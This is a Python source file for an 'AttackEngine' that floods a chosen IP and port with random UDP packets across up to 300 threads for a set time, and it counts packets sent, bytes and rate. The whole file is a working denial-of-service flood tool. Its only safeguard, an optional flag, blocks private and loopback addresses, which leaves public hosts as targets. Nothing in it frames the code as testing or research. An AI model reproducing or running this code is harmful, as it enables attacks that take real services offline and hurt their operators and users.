from __future__ import annotations
import asyncio, logging, socket, time, os, random
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from utils import is_private_or_loopback

LOGGER = logging.getLogger(__name__)

@dataclass
class AttackStats:
    sent: int = 0
    failed: int = 0
    bytes: int = 0
    start: float = 0.0
    running: bool = False
    
    @property
    def elapsed(self) -> float:
        return max(0.001, time.time() - self.start) if self.running else 0.001
    
    @property
    def rps(self) -> float:
        return self.sent / self.elapsed if self.elapsed > 0 else 0

class AttackEngine:
    def __init__(self, threads: int, max_dur: int, safety: bool = False):
        self.threads = min(threads, 300)  # Railway limit
        self.max_dur = max_dur
        self.safety = safety
        self.stats = AttackStats()
        self._stop = asyncio.Event()
        self._executor = ThreadPoolExecutor(max_workers=self.threads)
        
        # Pre-generate random payloads
        self._pool = []
        for _ in range(512):
            size = random.randint(64, 1400)
            self._pool.append(os.urandom(size))
        self._idx = 0

    def stop(self):
        self._stop.set()
        LOGGER.info("⏹️ Attack engine stopped")

    async def run_udp(self, ip: str, port: int, duration: int) -> AttackStats:
        if self.safety and is_private_or_loopback(ip):
            raise ValueError(f"Safety block: {ip}")
            
        dur = min(duration, self.max_dur)
        self.stats = AttackStats(start=time.time(), running=True)
        self._stop.clear()
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setblocking(False)
            
            # Increase buffer size
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)
            
            loop = asyncio.get_running_loop()
            
            def send_payload():
                while not self._stop.is_set():
                    try:
                        payload = self._pool[self._idx % len(self._pool)]
                        self._idx += 1
                        sock.sendto(payload, (ip, port))
                        self.stats.sent += 1
                        self.stats.bytes += len(payload)
                    except BlockingIOError:
                        time.sleep(0.001)
                    except OSError as e:
                        if e.errno == 105:  # No buffer space
                            time.sleep(0.01)
                        else:
                            self.stats.failed += 1
                    except Exception:
                        self.stats.failed += 1
            
            # Run in thread pool
            futures = []
            for _ in range(self.threads):
                fut = loop.run_in_executor(self._executor, send_payload)
                futures.append(fut)
            
            await asyncio.sleep(dur)
            self._stop.set()
            
            # Wait for threads to finish with timeout
            try:
                await asyncio.wait_for(
                    asyncio.gather(*futures, return_exceptions=True),
                    timeout=5.0
                )
            except asyncio.TimeoutError:
                LOGGER.warning("Some threads didn't stop gracefully")
            
            sock.close()
            
        except Exception as e:
            LOGGER.error(f"Attack error: {e}")
        
        self.stats.running = False
        return self.stats
